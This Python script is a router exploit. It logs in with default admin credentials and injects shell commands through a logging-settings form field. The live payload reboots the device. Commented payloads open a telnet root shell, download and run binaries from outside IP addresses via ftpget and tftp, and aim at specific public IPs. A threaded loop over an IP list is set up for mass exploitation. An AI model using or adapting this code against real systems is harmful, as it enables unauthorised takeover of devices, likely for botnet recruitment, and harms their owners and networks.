import os
import execjs
import requests, threading
import random, time
import hashlib
import datetime
import urllib3
import socket

urllib3.disable_warnings()
urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'
R = threading.Lock()

headers = ({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', })


def get_string(data, start_str, end_str):
    start_poc = data.find(start_str)
    if start_poc < 0:
        return ''

    i = 0
    start_poc = start_poc + len(start_str)
    while 1:
        try:
            if i > 50:
                return ''
            if data[start_poc + i:start_poc + len(end_str) + i] == end_str:
                return data[start_poc:start_poc + i]
            i += 1
        except:
            return ''


def get_encode_val(url):
    url = url + "/cgi-bin/welcome.cgi"
    try:
        req = requests.get(url=url, headers=headers, verify=False, timeout=30)
        if req.text.find("tmp2") > 0:
            return get_string(req.text, "tmp2='", "';")
    except:
        return ''


def get_cookies(url, username, password, ctx):
    password_key = str(password) + "1964300002"
    try:
        tmp2 = get_encode_val(url)
        if not tmp2:
            _password = ctx.call('hex_md5', password_key)
            # print('Error: tmp2 Not Found!')
            # return ''
        else:
            _password = ctx.call('encode_password', password_key, tmp2)
    except Exception as e:
        print(e)
        return ''
    data = {
        "login": "true",
        "portalname": "CommonPortal",
        "password_expired": "0",
        "auth_key": "1964300002",
        "md5_old_pass": "",
        "username": username,
        "password": _password,
        "current_password": "",
        "new_password": "",
        "re_new_password": ""
    }
    try:
        url = url + "/cgi-bin/userLogin.cgi"
        req = requests.post(url=url, headers=headers, data=data, verify=False, timeout=30)
        print(req.text)
        try:
            cookies = req.cookies['mlap']
        except:
            return ''
        if req.status_code == 200 and cookies:
            return cookies
    except Exception as e:
        print(e)
        return ''


def exploit1(url, username, password, ctx, cmds):
    i = 0
    for cmd in cmds:
        cookies = get_cookies(url, username, password, ctx)
        if cookies == '':
            print('Error: Get Cookies False!')
            return

        data = ('submitStatus=1&hostName=router7c62f0&log_ch=1&remoteLogger=1&enLogServer=on&LogServerName=1%40gmail.com\
    &mailAlert=1&enEmail=on&smtpServerName=2%40gmail.com&smtpauth=off&smtpPort=25&logPrefs_logEmailAddr=3%40gmail.com&LogQueueLength=50\
    &LogTimeThreshold=10;' + cmd + ';&synflood=0&spoofed=0&winnuke=0&badflag=0&login_fail=1&login_fail_check=1&OutputBlock=0&system_errs=1\
    &system_errs_check=1&conn_blocked=0&conn_accepted=0&conf_change=1&conf_change_check=1&login_success=1&login_success_check=1')

        _headers = {'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
                    'Cookie': 'mlap=' + cookies}

        try:
            url_setting = url + '/log_setting.htm'
            req = requests.post(url=url_setting, headers=_headers, data=data, verify=False, timeout=30)
            i += 1
            print "cmd_%d exec finish" % i
        except Exception as e:
            print(" " + str(e))
            return ''
        time.sleep(10)
        try:
            print "time_%d logout" % i
            url_logout = url + '/cgi-bin/welcome.cgi?&status=logout'
            # url_logout = url + '/home.htm'
            req_out = requests.get(url=url_logout, headers=_headers, verify=False, timeout=30)
            print req_out.status_code
            print req_out.text
        except Exception as e:
            return ""
        # how long does sleep need test
        time.sleep(60)
        # if i == 1:
        #     time.sleep(300)
        # else:
        #     time.sleep(120)


def exploit(url, username, password, ctx, cmds):
    i = 0
    proxy = {
        "https":"http:127.0.0.1:8080"
    }
    cookies = get_cookies(url, username, password, ctx)
    if cookies == '':
        print('Error: Get Cookies False!')
        return

    print "cookies: %s\n" % cookies
    _headers = {'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36',
                'Cookie': 'mlap=' + cookies}
    for cmd in cmds:

        data = ('submitStatus=1&hostName=router7c62f0&log_ch=1&remoteLogger=1&enLogServer=on&LogServerName=1%40gmail.com\
                &mailAlert=1&enEmail=on&smtpServerName=2%40gmail.com&smtpauth=off&smtpPort=25&logPrefs_logEmailAddr=3%40gmail.com&LogQueueLength=50\
                &LogTimeThreshold=10;' + cmd + ';&synflood=0&spoofed=0&winnuke=0&badflag=0&login_fail=1&login_fail_check=1&OutputBlock=0&system_errs=1\
                &system_errs_check=1&conn_blocked=0&conn_accepted=0&conf_change=1&conf_change_check=1&login_success=1&login_success_check=1')
        try:
            url_setting = url + '/log_setting.htm'
            req = requests.post(url=url_setting, headers=_headers, data=data, verify=False, timeout=30)
            print "status_code:%d\n" % req.status_code
            i += 1
            print "cmd_%d exec finish" % i
        except Exception as e:
            print("err: " + str(e))
            return ''
        # time.sleep(10)
        # try:
        #     print "time_%d logout" % i
        #     url_logout = url + '/cgi-bin/welcome.cgi?&status=logout'
        #     # url_logout = url + '/home.htm'
        #     req_out = requests.get(url=url_logout, headers=_headers, verify=False, timeout=30)
        #     print req_out.status_code
        #     print req_out.text
        # except Exception as e:
        #     return ""
        # how long does sleep need test
        time.sleep(5)
        # if i == 1:
        #     time.sleep(300)
        # else:
        #     time.sleep(120)
    # data = ('submitStatus=1&hostName=router7c62f0&log_ch=1&remoteLogger=1&enLogServer=on&LogServerName=1%40gmail.com\
    #                 &mailAlert=1&enEmail=on&smtpServerName=2%40gmail.com&smtpauth=off&smtpPort=25&logPrefs_logEmailAddr=3%40gmail.com&LogQueueLength=50\
    #                 &LogTimeThreshold=10&synflood=0&spoofed=0&winnuke=0&badflag=0&login_fail=1&login_fail_check=1&OutputBlock=0&system_errs=1\
    #                 &system_errs_check=1&conn_blocked=0&conn_accepted=0&conf_change=1&conf_change_check=1&login_success=1&login_success_check=1')
    # try:
    #     url_setting = url + '/log_setting.htm'
    #     req = requests.post(url=url_setting, headers=_headers, data=data, verify=False, timeout=30)
    #     print req.status_code
    # except Exception as e:
    #     print(" " + str(e))
    #     return ''


if __name__ == "__main__":
    os.environ["EXECJS_RUNTIME"] = "phantomjs"
    f = open(r"md5.js", 'r')
    js_str = f.read()
    # url = "https://192.168.1.1:443"
    # username = "admin"
    # password = "admin"
    # cmd = ['telnetd -l/bin/sh -p8888']
    # cmd = ["echo  -n 'aaaaaaaaaaaaaa' > /tmp/11"]

    # cmd = ["echo -n 'cd /tmp;'>/tmp/a",
    #        "echo -n 'ftpget -'>>/tmp/a",
    #        "echo -n 'ux -pq 1'>>/tmp/a",
    #        "echo -n '41.98.21'>>/tmp/a",
    #        "echo -n '2.13 c c'>>/tmp/a",
    #        "echo -n ';sleep 9'>>/tmp/a",
    #        "echo -n ';sh ./c'>>/tmp/a",
    #        "cd /tmp;sh ./a"]

    # cmd = ["echo -n 'cd /tmp;'>/tmp/w",
    #        "echo -n 'ftpget -'>>/tmp/w",
    #        "echo -n 'ux -pq 1'>>/tmp/w",
    #        "echo -n '92.168.1'>>/tmp/w",
    #        "echo -n '.101 z z'>>/tmp/w",
    #        "echo -n ';sleep 5'>>/tmp/w",
    #        "echo -n ';sh ./z'>>/tmp/w",
    #        "cd /tmp;sh ./w"]

    cmd = ['reboot']
    # ctx = execjs.compile(js_str)
    # exploit(url, username, password, ctx, cmd)
    sh_str = ''
    # cmd = ["cd /tmp;touch aaaaaaaaaaaaaaaaaa"]
    # cmd = [""]
    # cmd = ["cd /tmp;tftp 103.140.187.130 -gr b", "cd /tmp;chmod 777 b;mv b busybox-mips",
    #        "cd /tmp;tftp 103.140.187.130 -gr y", "cd /tmp;sh y", ""]
    # cmd = ["ftpget -ux -pq 141.98.212.13 /tmp/c c", "cd /tmp;sh ./c", ""]
    # cmd = ["echo 'a' > /tmp/stop.txt", ""]

    ctx = execjs.compile(js_str)
    username = "admin"
    # password = "admin"
    password = "admin"
    # exploit("https://192.168.1.1:443", username, password, ctx, cmd)
    # exploit("https://170.55.75.119:443", username, password, ctx, cmd)
    # exploit("https://68.198.24.106:443", username, password, ctx, cmd)
    exploit("https://192.168.1.1", username, password, ctx, cmd)


    # read_fd = open('ip.txt', 'r')
    # readlines = read_fd.readlines()
    # read_fd.close()
    # thread_list = []
    # for i in range(len(readlines)):
    #     target = readlines[i].split('\t')[0]
    #     if target.split(':')[2] == '443' and target.find('https') < 0:
    #         target = target.replace('http', 'https')
    #     http_thread = threading.Thread(target=exploit, args=(url, username, password, ctx, cmd))
    #     thread_list.append(http_thread)
    #
    # print("start...")
    # for thread in thread_list:
    #     thread.start()
    #     time.sleep(0.4)
    # for t in thread_list:
    #     t.join()
